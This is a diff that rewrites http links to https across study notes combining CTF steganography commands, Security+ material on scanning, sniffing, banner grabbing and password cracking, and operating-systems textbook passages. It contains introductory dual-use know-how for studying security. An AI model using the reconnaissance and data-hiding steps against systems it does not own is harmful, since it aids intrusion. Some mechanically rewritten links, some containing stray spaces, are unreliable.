@@ -1537,7 +1537,7 @@ Invisible Secrets是一套简单易用的文件加密软件，可以使用它为
 除outguess.org外，还可以在BackTrack网站(https://backtrack- linux.com/forensics-auditor/)上获取到。
       0x01 outguess
 linux下载安装比较简单:
- http://download.csdn.net/detail/florak/5620983
+ https://download.csdn.net/detail/florak/5620983
   ./configure && make && make install
 执行以下命令解密:
  outguess -r ‘/root/Desktop/angrybird.jpg’ -t 11.txt
@@ -1638,7 +1638,7 @@ steghide
 compression of embedded data
 encryption of embedded data
 embedding of a checksum to verify the integrity of the extracted data support for JPEG, BMP, WAV and AU files
-1. 官网地址:http://steghide.sourceforge.net/documentation.php 2. Install steghide
+1. 官网地址:https://steghide.sourceforge.net/documentation.php 2. Install steghide
 apt-get install steghide
      3. 先要cd到有文件的当下目录 4. 在文件中隐藏数据
 steghide embed -cf 1111.jpg -ef embeddate.txt
@@ -2940,7 +2940,7 @@ AES 256 256 SHA-1 65
 SHA 224 112 SHA 256 128 SHA 384 192 SHA 512 256 SHA-3 Variable
 1024 80 2048 112 3072 128 16384 256 224 112 256 128 384 192 521 260
 56
-2NIST, “Recommendation for Key Management – Part 1: General (Revision 3),” Special Publication 800-57, http://csrc.nist.gov/publications/nistpubs/800-57/sp800-57_part1_rev3_ general.pdf.
+2NIST, “Recommendation for Key Management – Part 1: General (Revision 3),” Special Publication 800-57, https://csrc.nist.gov/publications/nistpubs/800-57/sp800-57_part1_rev3_ general.pdf.
 30
 AES is typically used for the symmetric algorithm today. At 128 bits, the two most frequently used asymmetric algorithms are RSA 2048 or ECC 256. RSA 2048 isn’t quite
 as strong as ECC 256 and is much slower. It also takes up a lot more space. However, the patents on RSA have expired, and it’s compatible with most software today, so many people still use it. Many people are using RSA 2048 together with SHA-1 and AES-128, even though they’re far from a matched set, because they’re free and compatible. Most of the examples in this book use both RSA and ECC for encryption and decryption, but SHA 256 is used exclusively for hashing.
@@ -3373,7 +3373,7 @@ Training Users About Password Behaviors
 Common user habits related to password behaviors have historically ignored security. Many users don’t understand the value of their password, or the potential damage if they give it out. It’s important for an organization to provide adequate training to users on password security if
   they use passwords within the organization. This includes both the creation of strong passwords and the importance of never giving out their passwords.
 example, the password “123456” frequently appears on lists as the most common password in use. The users who are creating this password probably don’t know that it’s almost like using no password at all. Also, they probably don’t realize that they can significantly increase the password strength by using a simple passphrase such as “ICanCountTo6.” A little training can go a long way.
-Check out the online lab Using John the Ripper available at http:// gcgapremium.com/501labs/. It shows how easy it can be to crack weak passwords.
+Check out the online lab Using John the Ripper available at https:// gcgapremium.com/501labs/. It shows how easy it can be to crack weak passwords.
 Password Expiration
 In addition to using strong passwords, users should change their passwords regularly, such as every 45 or 90 days. In most systems, technical password policies require users to change their passwords regularly. When the password expires, users are no longer able to log on unless they first change their password.
 I can tell you from experience that if users are not forced to change their passwords through technical means, they often simply don’t. It doesn’t matter how many reminders you give them. On the other hand, when a password policy locks out user accounts until they change their password, they will change it right away.
@@ -4043,7 +4043,7 @@ packets from an IP address to identify the OS. This is often referred to as TCP/
 hosting an embedded web site running on port 80.  Figure 8.1: Zenmap scan
 Network Mapping
 Network mapping discovers devices on the network and how they are connected with each other. It is often done as part of a network scan, but it only focuses on connectivity. In contrast, a full network scan also includes additional scans to identify open ports, running services, and OS details.
-Some tools, such as Zenmap, provide y o u with a graphical representation of the network. To see how this looks, look a t the Nmap and Zenmap labs available at http://gcgapremium.com/501labs/.
+Some tools, such as Zenmap, provide y o u with a graphical representation of the network. To see how this looks, look a t the Nmap and Zenmap labs available at https://gcgapremium.com/501labs/.
 Wireless Scanners/Cracker
 Chapter 4, “Securing Your Network,” discusses how administrators often perform site surveys while planning and deploying a wireless network. Security personnel periodically repeat the site survey to verify the environment hasn’t changed.
 Wireless scanners can typically use both passive and active scans. When using a passive scan, a scanner just listens to all the traffic being broadcast on
@@ -4071,7 +4071,7 @@ Banner grabbing is a technique used to gain information about remote systems and
 <p>Additionally, a 404 Not Found error was encountered.</p><hr>
 <address>Apache/2.2.25 (Unix) mod_ssl/2.2.25 OpenSSL/1.0.0-fips mod_auth_ passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at 72.52.230.233 Port 80
 </ address> </body></html>
-Most of this is formatting. However, the information in the address section provides a lot of information on the web server. It shows this is a Unix server running the Apache web server software along with additional information. The command-line tool Netcat can be used for banner grabbing, as shown later in this chapter. You can also check out the Banner Grabbing Lab in the online exercises for this book at http://gcgapremium.com/501labs/.
+Most of this is formatting. However, the information in the address section provides a lot of information on the web server. It shows this is a Unix server running the Apache web server software along with additional information. The command-line tool Netcat can be used for banner grabbing, as shown later in this chapter. You can also check out the Banner Grabbing Lab in the online exercises for this book at https://gcgapremium.com/501labs/.
 Vulnerability Scanning
 A key part of a vulnerability assessment is a vulnerability scan. Security administrators often use a vulnerability scanner to identify which systems are susceptible to attacks. Vulnerability scanners identify a wide range of weaknesses and known security issues that attackers can exploit. Most vulnerability scanners combine multiple features into a single package. A vulnerability scan often includes the following actions:
 Identify vulnerabilities
@@ -4160,7 +4160,7 @@ Using Security Tools Several tools are available for use by security professiona
 Sniffing with a Protocol Analyzer
 A protocol analyzer can capture and analyze packets on a network. The
 process of using a protocol analyzer is sometimes referred to as sniffing or using a sniffer. Both administrators and attackers can use a protocol analyzer to view IP headers and examine packets. example, administrators can use a protocol analyzer to troubleshoot communication issues between network systems, or identify potential attacks using manipulated or fragmented packets.
-Attackers can use a protocol analyzer to capture data sent across a network in cleartext. example, unencrypted credentials are usernames and passwords sent across a network in cleartext. One of the ways attackers can view this data is by connecting an unauthorized switch within a network to capture traffic and forward it to a system running a protocol analyzer. If cabling isn’t protected, they might be able to simply connect a switch above a drop-down ceiling. Wireshark is a free protocol analyzer that y o u can download from the Wireshark site: http://www.wireshark.org/.
+Attackers can use a protocol analyzer to capture data sent across a network in cleartext. example, unencrypted credentials are usernames and passwords sent across a network in cleartext. One of the ways attackers can view this data is by connecting an unauthorized switch within a network to capture traffic and forward it to a system running a protocol analyzer. If cabling isn’t protected, they might be able to simply connect a switch above a drop-down ceiling. Wireshark is a free protocol analyzer that y o u can download from the Wireshark site: https://www.wireshark.org/.
 Figure 8.3 shows Wireshark after it captured packets transmitted over the network. It includes about 150 packets and has packet 121 selected in the top pane. The top pane shows the source and destination IP addresses and the Server Message Block (SMB) protocol. Many networks use SMB to send files over the network, and this packet includes the contents of that file. The middle pane shows details from this packet with the Internet Protocol version 4 header information partially expanded. The bottom pane shows the entire contents of the packet
 (including the unencrypted credentials) displayed in hexadecimal and ASCII characters.
   Figure 8.3: Wireshark capture
@@ -4177,7 +4177,7 @@ the knowledge of the owner. Similarly, Port Address Translation (PAT) translates
 When using a protocol analyzer, you need to configure the network interface card (NIC) on the system to use promiscuous mode. Normally, a NIC uses non-promiscuous mode and only processes packets addressed directly to its IP address. However, when you put it in promiscuous mode, it processes all packets regardless of the IP address. This allows the protocol analyzer to capture all packets that reach the NIC.
  Command-Line Tools
 Chapter 1 introduces some command-line tools available on Windows and Linux systems. Some tools are useful when performing vulnerability scans and penetration tests. Three tools discussed in this section are tcpdump, Nmap, and Netcat.
-As with any command-line tools, it’s best to dig in and give them a try. I strongly encourage you to check out the free online labs at http:// gcgapremium.com/501labs/ and do each of them.
+As with any command-line tools, it’s best to dig in and give them a try. I strongly encourage you to check out the free online labs at https:// gcgapremium.com/501labs/ and do each of them.
 Tcpdump
 Tcpdump is a command-line packet analyzer (or protocol analyzer). It allows you to capture packets like you can with Wireshark (mentioned in the “Sniffing with a Protocol Analyzer” section). The difference is that Wireshark is a Windows-based tool and tcpdump is executed from the command line. Many administrators use tcpdump to capture the packets and later use Wireshark to analyze the packet capture. One of the online labsfor this chapter shows how to do this.
 Kali Linux includes tcpdump, but you won’t find it on Windows systems. As with most Linux command-line tools, tcpdump is case sensitive. You need to enter tcpdump in all lowercase. Additionally, the switches must be entered with the proper case. example, -c (lowercase c) represents count and indicates the capture should stop after receiving the specified number of packets. However, -C (uppercase C) represents file size and indicates the maximum size (in millions of bytes) of a packet capture. When the file reaches this size, tcpdump closes it and starts storing packets in a new file.
@@ -4729,7 +4729,7 @@ A hot site includes everything needed to be operational within 60 minutes. It is
 ## expensive. A cold site has power and connectivity requirements and little else. It is the least expensive to maintain. Warm sites are a compromise between hot sites and cold sites.
 Periodic testing validates continuity of operations plans. Exercises validate the steps to restore individual systems, activate alternate sites, and document other actions within a plan. Tabletop exercises are discussion-based only. Functional exercises are hands-on exercises.
 Online References
-Do you know how to answer performance-based questions? Check out the online extras athttp://gcgapremium.com/501-extras.
+Do you know how to answer performance-based questions? Check out the online extras athttps://gcgapremium.com/501-extras.
 Chapter 10 Exam Topic Review
 When preparing for the exam, make sure you understand these key concepts covered in this chapter.
 Introducing Cryptography Concepts
@@ -4995,7 +4995,7 @@ Any type of identification number, such as a Social Security number (SSN) or dri
 In general, you need two or more pieces of information to make it PII. example, “John Smith” is not PII by itself because it can’t be traced back to a specific person. However, when you connect the name with a birth date, an address, medical information, or other data, it is PII.
 When attackers gain PII, they often use it for financial gain at the expense of the individual. example, attackers steal identities, access credit cards, and empty bank accounts. Whenever possible, organizations should minimize the use, collection, and retention of PII. If it’s not kept, it can’t be compromised. On the other hand, if they collect PII and attackers compromise the data, the company is liable.
 The number of security breach incidents resulting in the loss of PII continues to rise. example, a Veteran’s Affairs (VA) employee copied a database onto his laptop that contained PII on over 26 million U.S. veterans. He took the laptop home and a burglar stole it. The VA then went through the painful and expensive process of notifying all of the people who were vulnerable to identity theft, and the affected individuals spent countless hours scouring their records for identity theft incidents. Even though police later recovered the laptop, the VA paid $20 million to settle a lawsuit in the case.
-This is not an isolated incident. The Identity Theft Resource Center tracks data breaches and lists them on their site (http://www.idtheftcenter.org/). Their 2015 report reported the number of
+This is not an isolated incident. The Identity Theft Resource Center tracks data breaches and lists them on their site (https://www.idtheftcenter.org/). Their 2015 report reported the number of
 known U.S. data breaches at 780, exposing more than 177 million records containing PII and/or PHI. Some data breaches were small, affecting only a few hundred people. Others were large such as the attack on Scottrade, accessing more than 4.6 million records. Many times, the
  companies don’t even report how many records were accessed, so the number of data records in the hands of criminals is very likely much higher.
 Each of these instances resulted in potential identity theft and the loss of goodwill and public trust of the company. Both customers and employees were negatively impacted, and the companies were forced to spend time and energy discussing the incident, and spend money trying to repair their reputations.
@@ -5007,7 +5007,7 @@ One of the common reasons data seems to fall into the wrong hands is that employ
 Training is also important. One of the goals of security professionals is to reinforce the risks of not protecting PII. When employees understand the risks, they are less likely to risk customer and employee data to identity theft. Additionally, if employees need to transmit PII over a network, they can ensure it’s protected by using encryption. As mentioned previously in this book, encrypting data-in-transit provides strong protection against loss of
 confidentiality.
 Many governments have enacted laws mandating the protection of both PII and PHI. Also, there are many documents that provide guidance on how to protect it. The National Institute of Standards and Technology (NIST) created Special Publication (SP) 800-122 “Guide to Protecting the Confidentiality of Personally Identifiable Information (PII).” It identifies many specific safeguards that organizations can implement to protect PII along with steps to take in response to a data breach involving PII. You can access all the NIST publications at
-http://csrc.nist. gov/publications/PubsSPs.html.
+https://csrc.nist. gov/publications/PubsSPs.html.
 Legal and Compliance Issues
 Organizations have a responsibility to follow all laws that apply to them, and ensure that they remain in compliance. Within the context of data security and privacy, the following laws are often a key concern:
 Health Insurance Portability and Accountability Act of 1996 (HIPAA). HIPAA mandates that organizations protect PHI. This includes any information directly related to the health of an
@@ -5083,7 +5083,7 @@ Capture System Image
 A forensic image of a disk captures the entire contents of the drive. Some tools use bit-by- bit copy methods that can read the data without modifying it. Other methods include hardware devices connected to the drive to write-protect it during the copy process.
 Chapter 5, “Securing Hosts and Data,” introduces disk images as a
 common method used to deploy systems. These system disk images include mandatory security configurations and help ensure a system starts in a secure state. A distinct difference between standard system images and forensic images is that a forensic image is an exact copy and does not modify the original. This isn’t always true with system imaging tools.
-One of the oldest disk imaging tools used for forensics is the dd command available in Linux systems, including Kali Linux. It can also be installed on Windows systems. To see how dd works, check out the labs for this chapter at http://gcgapremium.com/501labs/.
+One of the oldest disk imaging tools used for forensics is the dd command available in Linux systems, including Kali Linux. It can also be installed on Windows systems. To see how dd works, check out the labs for this chapter at https://gcgapremium.com/501labs/.
 These methods capture the entire contents of the disk, including system files, user files, and files marked for deletion but not overwritten. Similarly, many tools include the ability to capture data within volatile memory and save it as an image.
 After capturing an image, experts create a copy and analyze the copy. They do not analyze the original disk and often don’t even analyze the original image. They understand that by analyzing the contents of a disk directly, they can modify the contents. By creating and analyzing forensic copies, they never modify the original evidence.
 Take Hashes
@@ -5200,7 +5200,7 @@ Role-based training ensures that personnel receive the training they need. examp
 Common roles that require role-based training are data owners, system administrators, system owners, end users, privileged users, and executive users.
 Continuing education programs ensure that personnel are kept up to date on current technologies, threats, and vulnerabilities.
 Online References
-Do you know how to answer performance-based questions? Check out the online extras at http:// gcgapremium.com/501-extras.
+Do you know how to answer performance-based questions? Check out the online extras at https:// gcgapremium.com/501-extras.
 Index
 Numbers
 3DES, 438
@@ -6458,7 +6458,7 @@ Alternatively, the disk rotation speed can stay constant, the density of bits de
   - used in hard disks, called Constant angular velocity (CAV).
 The number of sectors per track and cylinders per disk increase, outer zone of a disk usually has several hundred sectors per track, large disks have tens of thousands of cylinders.
 Note that there are many types of storage devices:
-example, there are “shingled magnetic recording” hard drives with higher density but worse performance than mainstream HDDs (see http://www.tomsitpro.com/articles/ shingled-magnetic-recoding-smr-101-basics,2-933.html).
+example, there are “shingled magnetic recording” hard drives with higher density but worse performance than mainstream HDDs (see https://www.tomsitpro.com/articles/ shingled-magnetic-recoding-smr-101-basics,2-933.html).
 There are also combination devices that include NVM and HDD technology, or volume managers that can knit together NVM and HDD devices into a storage unit faster than HDD but lower cost than NVM.
 These devices have different characteristics from the more common devices, and might need different caching and scheduling algorithms to maximize performance.
 Disk Attachment
@@ -6596,7 +6596,7 @@ Thus, all single-bit errors are detected by the memory system.
 A double-bit-error might go undetected, however. Note that parity is easily calculated by performing an XOR (“eXclusive OR”) of the bits. Also note that for every byte of memory, we need an extra bit of memory to store the parity.
 Parity is one form of checksums, which use modular arithmetic to compute, store, and compare values on fixed-length words.
 Another common network error-detection is cyclic redundancy check (CRCs)
-Uses hash function to detect multiple-bit errors (see http://www.mathpages.com/home/ kmath458/kmath458.htm). An error-correcton code (ECC): detects + corrects the problem
+Uses hash function to detect multiple-bit errors (see https://www.mathpages.com/home/ kmath458/kmath458.htm). An error-correcton code (ECC): detects + corrects the problem
 The correction is done by using algorithms and extra amounts of storage.
 The codes vary based on how much extra storage they need and how many errors they can correct.
 example:
@@ -7043,7 +7043,7 @@ Traditional volumes and file systems compared with the ZFS model.
 Object storage management software, such as the                   (    ) and     , determines where to store the objects and manages object protection. Typically, this occurs on commodity hardware rather than RAID arrays. example, HDFS can store N copies of an object on N different com- puters. This approach can be lower in cost than storage arrays and can provide fast access to that object (at least on those N systems). All systems in a Hadoop cluster can access the object, but only systems that have a copy have fast access via the copy. Computations on the data occur on those systems, with results sent across the network, example, only to the systems requesting them. Other systems need network connectivity to read and write to the object. There- fore, object storage is usually used for bulk storage, not high-speed random access. Object storage has the advantage of                       . That is, whereas a storage array has a fixed maximum capacity, to add capacity to an object store, we simply add more computers with internal disks or attached external disks and add them to the pool. Object storage pools can be petabytes in size.
 Another key feature of object storage is that each object is self-describing, including description of its contents. In fact, object storage is also known as                            , because objects can be retrieved based on their contents. There is no set format for the contents, so what the system stores is                  .
 While object storage is not common on general-purpose computers, huge amounts of data are stored in object stores, including Google’s Internet search contents, Dropbox contents, Spotify’s songs, and Facebook photos. Cloud computing (such as Amazon AWS) generally uses object stores (in Amazon S3) to hold file systems as well as data objects for customer applications running on cloud computers.
-                       For the history of object stores see http://www.theregister.co.uk/2016/07/15
+                       For the history of object stores see https://www.theregister.co.uk/2016/07/15
  /the history boys cas and object storage map. 11.9 Summary
 Harddiskdrivesandnonvolatilememorydevicesarethemajorsecondary storage I/O units on most computers. Modern secondary storage is struc- tured as large one- dimensional arrays of logical blocks.
 Drivesofeithertypemaybeattachedtoacomputersysteminoneofthree ways: (1) through the local I/O ports on the host computer, (2) directly connected to motherboards, or (3) through a communications network or storage network connection.
@@ -7080,7 +7080,7 @@ Further Reading
 
 
 ## (2003)].
-[Russinovich et al. (2017)], [McDougall and Mauro (2007)], and [Love (2010)] discuss file-system details in Windows, Solaris, and Linux, respectively. Storage devices are continuously evolving, with goals of increasing perfor- mance, increasing capacity, or both. For one direction in capacity improvement see http://www.tomsitpro.com/articles/ shingled-magnetic-recoding-smr-101-
+[Russinovich et al. (2017)], [McDougall and Mauro (2007)], and [Love (2010)] discuss file-system details in Windows, Solaris, and Linux, respectively. Storage devices are continuously evolving, with goals of increasing perfor- mance, increasing capacity, or both. For one direction in capacity improvement see https://www.tomsitpro.com/articles/ shingled-magnetic-recoding-smr-101-
 basics,2-933.html).
 Redundant Array of Independent / Inexpensive Disks (RAID)
 Technology uses multiple disks to provide fault tolerance. There are several designations for RAID levels.
@@ -8132,7 +8132,7 @@ A real-time system has well-defined, fixed time constraints. Processing must be 
              a robot arm to be instructed to halt after it had smashed into the car it was building. A real-time system functions correctly only if it returns the correct result within its time constraints. Contrast this sys- tem with a traditional laptop system where it is desirable (but not mandatory) to respond quickly.
 In Chapter 5, we consider the scheduling facility needed to implement real- time functionality in an operating system, and in Chapter 20 we describe the real-time components of Linux.
 1.11 Free and Open-Source Operating Systems
-The study of operating systems has been made easier by the avail- ability of a vast number of free software and open-source releases. Both free operating systems and open-source operating systems are available in source-code format rather than as compiled binary code. Note, though, that free software and open-source software are two different ideas championed by different groups of people (see http://gnu.org/ philosophy/open-source-misses-the-point.html/ for a discussion on the topic). Free software (sometimes referred to as free/libre software) not only makes source code available but also is licensed to allow no-cost use, redistribution, and modification. Open-source software does not necessarily offer such licensing. Thus, although all free software is open source, some open-source software is not “free.” GNU/Linux is the most famous open-source operating system, with some distributions free and others open source only (http://www.gnu.org/distros/). Microsoft Windows is a well-known example of the opposite closed-source approach. Windows is proprietary software—Microsoft owns it, restricts its use, and carefully protects its source code. Apple’s macOS operating system comprises a hybrid
+The study of operating systems has been made easier by the avail- ability of a vast number of free software and open-source releases. Both free operating systems and open-source operating systems are available in source-code format rather than as compiled binary code. Note, though, that free software and open-source software are two different ideas championed by different groups of people (see https://gnu.org/ philosophy/open-source-misses-the-point.html/ for a discussion on the topic). Free software (sometimes referred to as free/libre software) not only makes source code available but also is licensed to allow no-cost use, redistribution, and modification. Open-source software does not necessarily offer such licensing. Thus, although all free software is open source, some open-source software is not “free.” GNU/Linux is the most famous open-source operating system, with some distributions free and others open source only (https://www.gnu.org/distros/). Microsoft Windows is a well-known example of the opposite closed-source approach. Windows is proprietary software—Microsoft owns it, restricts its use, and carefully protects its source code. Apple’s macOS operating system comprises a hybrid
 1.11 Free and Open-Source Operating Systems 47
 approach. It contains an open-source kernel named Darwin but includes proprietary,
 closed-source components as well.
@@ -8153,10 +8153,10 @@ You can run Linux on a Windows (or other) system using the following simple, fre
 1. Download the free Virtualbox VMM tool from https://www.virtualbox.org/
 and install it on your system.
 2. Choose to install an operating system from scratch, based on an installation image like a CD, or choose pre-built operating-system images that can be installed and run more quickly from a site like
-http://virtualboxes.org/images/
+https://virtualboxes.org/images/
 These images are preinstalled with operating systems and applications and include many flavors of GNU/Linux.
 3. Boot the virtual machine within Virtualbox.
-An alternative to using Virtualbox is to use the free program Qemu (http://wiki.qemu.org/ Download/), which includes the qemu-img command for converting Virtualbox images to Qemu images to easily import them.
+An alternative to using Virtualbox is to use the free program Qemu (https://wiki.qemu.org/ Download/), which includes the qemu-img command for converting Virtualbox images to Qemu images to easily import them.
 With this text, we provide a virtual machine image of GNU/Linux running the Ubuntu release. This image contains the GNU/Linux source code as well as tools for software development. We cover examples involving the GNU/Linux image throughout this text, as well as in a detailed case study in Chapter 20.
 1.11.4 BSD UNIX
 BSD UNIX has a longer and more complicated history than Linux. It started in 1978 as a derivative of AT&T’s UNIX. Releases from the University of California at Berkeley (UCB) came in source and binary form, but they were not open source because a license from AT&T was required. BSD UNIX’s development was slowed by a lawsuit by AT&T, but eventually a fully functional, open-source version, 4.4BSD-lite, was released in 1994.
@@ -8164,19 +8164,19 @@ Just as with Linux, there are many distributions of BSD UNIX, including FreeBSD,
 As with many open-source projects, this source code is contained in and controlled by a version control system—in this case, “subversion” (https://subversion.apache.org/ source-code). Version control systems allow a user to “pull” an entire source code tree to his computer and “push” any changes back into the repository for others to then pull. These systems also provide other features, including an entire history of each file and a conflict resolution feature in case the same file is changed concurrently. Another
 50 Chapter 1 Introduction
 version control system is git, which is used for GNU/Linux, as well as other programs
-(http://www.git-scm.com).
-Darwin, the core kernel component of macOS, is based on BSD UNIX and is open- sourced as well. That source code is available from http://www.opensource.apple.com/. Every macOS release has its open-source components posted at that site. The name of the package that contains the kernel begins with “xnu.” Apple also provides extensive developer tools, documentation, and support at http://developer.apple.com.
+(https://www.git-scm.com).
+Darwin, the core kernel component of macOS, is based on BSD UNIX and is open- sourced as well. That source code is available from https://www.opensource.apple.com/. Every macOS release has its open-source components posted at that site. The name of the package that contains the kernel begins with “xnu.” Apple also provides extensive developer tools, documentation, and support at https://developer.apple.com.
 THE STUDY OF OPERATING SYSTEMS
 There has never been a more interesting time to study operating systems, and it has never been easier. The open-source movement has overtaken oper- ating systems, causing many of them to be made available in both source and binary (executable) format. The list of operating systems available in both formats includes Linux, BSD UNIX, Solaris, and part of macOS. The availabil- ity of source code allows us to study operating systems from the inside out. Questions that we could once answer only by looking at documentation or the behavior of an operating system we can now answer by examining the code itself.
-Operating systems that are no longer commercially viable have been open-sourced as well, enabling us to study how systems operated in a time of fewer CPU, memory, and storage resources. An extensive but incomplete list of open-source operating-system projects is available from http://dmoz.org/Computers/Software/Operating Systems/Open Source/.
-In addition, the rise of virtualization as a mainstream (and frequently free) computer function makes it possible to run many operating systems on top of one core system. example, VMware (http://www.vmware.com) pro- vides a free “player” for Windows on which hundreds of free “virtual appli- ances” can run. Virtualbox (http:// www.virtualbox.com) provides a free, open-source virtual machine manager on many operating systems. Using such tools, students can try out hundreds of operating systems without ded- icated hardware.
+Operating systems that are no longer commercially viable have been open-sourced as well, enabling us to study how systems operated in a time of fewer CPU, memory, and storage resources. An extensive but incomplete list of open-source operating-system projects is available from https://dmoz.org/Computers/Software/Operating Systems/Open Source/.
+In addition, the rise of virtualization as a mainstream (and frequently free) computer function makes it possible to run many operating systems on top of one core system. example, VMware (https://www.vmware.com) pro- vides a free “player” for Windows on which hundreds of free “virtual appli- ances” can run. Virtualbox (https:// www.virtualbox.com) provides a free, open-source virtual machine manager on many operating systems. Using such tools, students can try out hundreds of operating systems without ded- icated hardware.
 In some cases, simulators of specific hardware are also available, allow- ing the operating system to run on “native” hardware, all within the con- fines of a modern computer and modern operating system. example, a DECSYSTEM-20 simulator running on macOS can boot TOPS-20, load the source tapes, and modify and compile a new TOPS-20 kernel. An interested student can search the Internet to find the original papers that describe the operating system, as well as the original manuals.
 The advent of open-source operating systems has also made it easier to make the move from student to operating-system developer. With some knowledge, some effort, and an Internet connection, a student can even create a new operating-system distribution. Not so many years ago, it was difficult or impossible to get access to source code. Now, such access is limited only by how much interest, time, and disk space a student has.
 1.11.5 Solaris
 Solaris is the commercial UNIX-based operating system of Sun Microsystems. Originally, Sun’s SunOS operating system was based on BSD UNIX. Sun moved to AT&T’s System V UNIX as its base in 1991. In 2005, Sun open-sourced most of the Solaris code as the OpenSolaris project. The purchase of Sun by Oracle in 2009, however, left the state of this project unclear.
-Several groups interested in using OpenSolaris have expanded its features, and their working set is Project Illumos, which has expanded from the Open- Solaris base to include more features and to be the basis for several products. Illumos is available at http://wiki.illumos.org.
+Several groups interested in using OpenSolaris have expanded its features, and their working set is Project Illumos, which has expanded from the Open- Solaris base to include more features and to be the basis for several products. Illumos is available at https://wiki.illumos.org.
 1.11.6 Open-Source Systems as Learning Tools
-The free-software movement is driving legions of programmers to create thousands of open-source projects, including operating systems. Sites like http://freshmeat.net/ and http://distrowatch.com/ provide portals to many of these projects. As we stated earlier, open-source projects enable students to use source code as a learning tool. They can modify programs and test them, help find and fix bugs, and otherwise explore mature, full-featured operating systems, compilers, tools, user interfaces, and other types of programs. The availability of source code for historic projects, such as Multics, can help stu- dents to understand those projects and to build knowledge that will help in the
+The free-software movement is driving legions of programmers to create thousands of open-source projects, including operating systems. Sites like https://freshmeat.net/ and https://distrowatch.com/ provide portals to many of these projects. As we stated earlier, open-source projects enable students to use source code as a learning tool. They can modify programs and test them, help find and fix bugs, and otherwise explore mature, full-featured operating systems, compilers, tools, user interfaces, and other types of programs. The availability of source code for historic projects, such as Multics, can help stu- dents to understand those projects and to build knowledge that will help in the
  implementation of new projects.
 Another advantage of working with open-source operating systems is their diversity. GNU/Linux and BSD UNIX are both open-source operating systems, for instance, but each has its own goals, utility, licensing, and purpose. Some- times, licenses are not mutually exclusive and cross-pollination occurs, allow- ing rapid improvements in operating-system projects. example, several major components of OpenSolaris have been ported to BSD UNIX. The advan- tages of free software and open sourcing are likely to increase the number and quality of open-source projects, leading to an increase in the number of individuals and companies that use these projects.
 1.12 Summary Anoperatingsystemissoftwarethatmanagesthecomputerhardware,as
@@ -8229,7 +8229,7 @@ why not make it that large and eliminate the device?
 1.11 Distinguish between the client–server and peer-to-peer models of dis- tributed systems.
 Further Reading
 Many general textbooks cover operating systems, including [Stallings (2017)] and [Tanenbaum (2014)]. [Hennessy and patternson (2012)] provide coverage of I/O systems and buses and of system architecture in general. [Kurose and Ross (2017)] provides a general overview of computer networks.
-[Russinovich et al. (2017)] give an overview of Microsoft Windows and cov- ers considerable technical detail about the system internals and components. [McDougall and Mauro (2007)] cover the internals of the Solaris operating system. The macOS and iOS internals are discussed in [Levin (2013)]. [Levin (2015)] covers the internals of Android. [Love (2010)] provides an overview of the Linux operating system and great detail about data structures used in the Linux kernel. The Free Software Foundation has published its philosophy at http://www.gnu.org/philosophy/free-software-for-freedom.html. Bibliography
+[Russinovich et al. (2017)] give an overview of Microsoft Windows and cov- ers considerable technical detail about the system internals and components. [McDougall and Mauro (2007)] cover the internals of the Solaris operating system. The macOS and iOS internals are discussed in [Levin (2013)]. [Levin (2015)] covers the internals of Android. [Love (2010)] provides an overview of the Linux operating system and great detail about data structures used in the Linux kernel. The Free Software Foundation has published its philosophy at https://www.gnu.org/philosophy/free-software-for-freedom.html. Bibliography
 [Hennessy and patternson (2012)] J. Hennessy and D. patternson, Computer Archi- tecture: A Quantitative Approach, Fifth Edition, Morgan Kaufmann (2012).
 [Kurose and Ross (2017)] J. Kurose and K. Ross, Computer Networking—A Top– Down Approach, Seventh Edition, Addison-Wesley (2017).
 [Levin (2013)]
@@ -8776,7 +8776,7 @@ At a slightly less tailored level, the system description can lead to the selec-
 At the other extreme, it is possible to construct a system that is completely modular. Here, selection occurs at execution time rather than at compile or link time. System generation involves simply setting the parameters that describe the system configuration.
                                                
 The major differences among these approaches are the size and generality of the generated system and the ease of modifying it as the hardware configu- ration changes. For embedded systems, it is not uncommon to adopt the first approach and create an operating system for a specific, static hardware config- uration. However, most modern operating systems that support desktop and laptop computers as well as mobile devices have adopted the second approach. That is, the operating system is still generated for a specific hardware config- uration, but the use of techniques such as loadable kernel modules provides modular support for dynamic changes to the system. We now illusrate how to build a Linux system from scratch, where it is typically necessary to perform the following steps:
-   Download the Linux source code from http://www.kernel.org.
+   Download the Linux source code from https://www.kernel.org.
    Configure the kernel using the “make menuconfig” command. This step
 generates the .config configuration file.
    Compile the main kernel using the “make” command. The make command compiles the kernel based on the configuration parameters identified in the .config file, producing the file vmlinuz, which is the kernel image.
@@ -9212,7 +9212,7 @@ Chapter 2, “Understanding Identity and Access Management,” covers these topi
 A third method you can use for confidentiality is steganography. Chapter 10 covers steganography in more depth, but as an introduction, it is the practice of hiding data within data. It obscures the data and can be used in a use case to support obfuscation.
 Obfuscation methods attempt to make something unclear or difficult to understand. Within the context of information technology (IT) security, it’s called security by obscurity or security through obscurity. It’s worth noting that most security experts reject security through obscurity as a reliable method of maintaining security.
 Many people refer to steganography as hiding data in plain sight. example, you can embed a hidden message in an image by modifying certain bits within the file. If other people look at the file, they won’t notice anything. However, if other people know what to look for, they will be able to retrieve the message.
-As a simpler example, you can add a text file to an image file without the use of any special tools other than WinRAR and the Windows command line. If you’re interested in seeing how to do this, check out the Steganography Lab in the online exercises for this book at http://gcgapremium.com/501labs/.
+As a simpler example, you can add a text file to an image file without the use of any special tools other than WinRAR and the Windows command line. If you’re interested in seeing how to do this, check out the Steganography Lab in the online exercises for this book at https://gcgapremium.com/501labs/.
 Provide Integrity
 Another common use case is to support integrity. Integrity provides assurances that data has not changed. This includes ensuring that no one has modified, tampered with, or corrupted the data. Ideally, only authorized users modify data. However, there are times when unauthorized or unintended changes occur. This can be from unauthorized users, from malicious
 software (malware), and through system and human errors. When this occurs, the data has lost integrity.
@@ -9223,7 +9223,7 @@ example, imagine Homer is sending a message to Marge and they both want assuranc
 You can use hashes with messages, such as email, and any other type of data files. Some email programs use a message authentication code (MAC) instead of a hash to verify integrity, but the underlying concept works the same way.
 You can also use hashing techniques to verify that integrity is maintained when files are downloaded or transferred. Some programs can automatically check hashes and determine if a file loses even a single bit during the download process. The program performing the download will detect it by comparing the source hash with the destination hash. If a program detects that the hashes are different, it knows that integrity has been lost and reports the problem to the user. As another example, a web site administrator can calculate and post the hash of a file on a web site. Users can manually calculate the hash of the file
 after downloading it and compare the calculated hash with the posted
-hash. If a virus infects a file on the web server, the hash of the infected file would be different from the hash of the original file (and the hash posted on the web site). You can use freeware such as md5sum.exe to calculate MD5 hashes. If you want to see this in action, check out the Creating and Comparing Hashes Lab in the online exercises for this book at http://gcgapremium.com/ 501labs/.
